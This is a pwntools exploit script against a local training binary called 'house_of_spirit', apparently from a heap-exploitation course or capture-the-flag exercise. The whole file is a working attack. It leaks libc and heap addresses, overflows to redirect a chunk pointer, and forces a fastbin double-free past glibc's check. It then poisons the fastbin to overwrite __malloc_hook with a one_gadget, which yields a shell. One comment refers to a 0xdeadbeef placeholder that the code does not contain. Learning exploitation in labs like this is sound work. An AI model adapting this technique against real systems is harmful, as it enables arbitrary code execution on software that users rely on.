#!/usr/bin/env python
from pwn import *

ONE_GADGET = 0xE1FA1

BINARY = "./house_of_spirit"
elf = context.binary = ELF(BINARY)
LIBC = elf.runpath + b"/libc.so.6"
LD = elf.runpath + b"/ld.so.2"
libc = ELF(LIBC, checksec=False)
ld = ELF(LD, checksec=False)

gs = """
continue
"""


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size, data & chunk name.
# Returns chunk index.
def malloc(size, data, name):
    global index
    io.send("1")
    io.sendafter("size: ", f"{size}")
    io.sendafter("data: ", data)
    io.sendafter("name: ", name)
    io.recvuntil("> ")
    index += 1
    return index - 1


# Select the "free" option; send the index.
def free(index):
    io.send("2")
    io.sendafter("index: ", f"{index}")
    io.recvuntil("> ")


io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil("puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts

# This binary leaks the heap start address.
io.recvuntil("heap @ ")
heap = int(io.recvline(), 16)
io.timeout = 0.1

# Ignore the "age" field.
age = 0
io.sendafter("age: ", f"{age}")

# Ignore the "username" field.
username = "George"
io.sendafter("username: ", username)
io.recvuntil("> ")

# Request 2 chunks.
# The "dup" chunk will be duplicated, the "safety" chunk is used to bypass the fastbins double-free mitigation.
dup = malloc(0x68, "A" * 8, "A" * 8)
safety = malloc(0x68, "B" * 8, "B" * 8)

# Request a 3rd "spirit" chunk of any size, leverage the stack overflow to overwrite the pointer to this chunk
# with the address of the "dup" chunk.
spirit = malloc(0x18, "C" * 8, b"C" * 8 + pack(heap + 0x10))

# Coerce a double-free by freeing the "dup" chunk, then the "safety" chunk, then the "spirit" chunk.
# This way the "dup" chunk is not at the head of its fastbin when it's freed for the 2nd time,
# bypassing the fastbins double-free mitigation.
free(dup)
free(safety)
free(spirit)

# The next request for a 0x70-sized chunk will be serviced by the "dup" chunk.
# Request it, then overwrite its fastbin fd, pointing it at a fake chunk overlapping your target data (e.g. the malloc hook).
# Replace 0xdeadbeef with the address of a fake chunk.
malloc(0x68, flat(libc.sym.__malloc_hook - 0x23), "C" * 8)
malloc(0x68, flat(cyclic(8, n=8)), cyclic(8, n=8))
malloc(0x68, flat(cyclic(8, n=8)), cyclic(8, n=8))

payload = [
    cyclic(cyclic_find(0x6161646161616161, n=8), n=8),
    libc.address + ONE_GADGET,
]

malloc(0x68, flat(payload), cyclic(8, n=8))
malloc(0x18, flat(cyclic(0x18, n=8)), cyclic(0x8, n=8))

io.interactive()
